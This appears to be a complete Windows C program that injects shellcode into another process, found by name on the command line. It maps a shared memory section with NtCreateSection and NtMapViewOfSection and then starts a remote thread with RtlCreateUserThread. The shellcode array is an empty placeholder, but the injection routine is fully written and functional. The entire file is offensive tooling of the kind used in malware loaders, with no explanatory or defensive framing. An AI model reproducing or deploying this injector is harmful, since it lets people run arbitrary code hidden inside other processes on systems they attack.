#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char shellcode[] = { /*insert shellcode here*/ };
unsigned int shellcodeLength = sizeof(shellcode);

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Native API function pointers
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributes,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL); 

typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId);

int LocateProcess(const char *processName) {
    int processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 processEntry;        
    processEntry.dwSize = sizeof(PROCESSENTRY32); 
                
    if (!Process32First(snapshot, &processEntry)) {
        CloseHandle(snapshot);
        return 0;
    }
                
    while (Process32Next(snapshot, &processEntry)) {
        if (lstrcmpiA(processName, processEntry.szExeFile) == 0) {
            processId = processEntry.th32ProcessID;
            break;
        }
    }
        
    printf("Located Process ID = %d\n", processId);        
    CloseHandle(snapshot);
                
    return processId;
}

// Memory injection using section mapping
int PerformInjection(HANDLE targetProcess, unsigned char * shellcode, unsigned int shellcodeSize) {

    HANDLE section = NULL, remoteThread = NULL; 
    PVOID localView = NULL, remoteView = NULL;
    CLIENT_ID clientId;

    // Create a memory section
    NtCreateSection_t createSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if (!createSection) return GetLastError();
    createSection(&section, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcodeSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map a view of the memory section
    NtMapViewOfSection_t mapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if (!mapViewOfSection) return GetLastError();
    mapViewOfSection(section, GetCurrentProcess(), &localView, NULL, NULL, NULL, (SIZE_T *) &shellcodeSize, ViewUnmap, NULL, PAGE_READWRITE);

    // Copy the shellcode to the local view
    memcpy(localView, shellcode, shellcodeSize);
    
    // Map the shellcode into the target process space
    mapViewOfSection(section, targetProcess, &remoteView, NULL, NULL, NULL, (SIZE_T *) &shellcodeSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // Start a thread in the target process to execute the shellcode
    RtlCreateUserThread_t createThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if (!createThread) return GetLastError();

    createThread(targetProcess, NULL, FALSE, 0, 0, 0, remoteView, NULL, &remoteThread, &clientId);
    if (!remoteThread) return GetLastError();
    
    WaitForSingleObject(remoteThread, 500);
    CloseHandle(remoteThread);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) return GetLastError();

    // Locate the target process by its name
    int processId = LocateProcess(argv[1]);
    if (processId == 0) return GetLastError();

    // Open the target process with necessary privileges
    HANDLE targetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) processId);
    if (!targetProcess) return GetLastError(); 
        
    // Inject the shellcode
    PerformInjection(targetProcess, shellcode, shellcodeLength);
    CloseHandle(targetProcess);
    return 0;
}
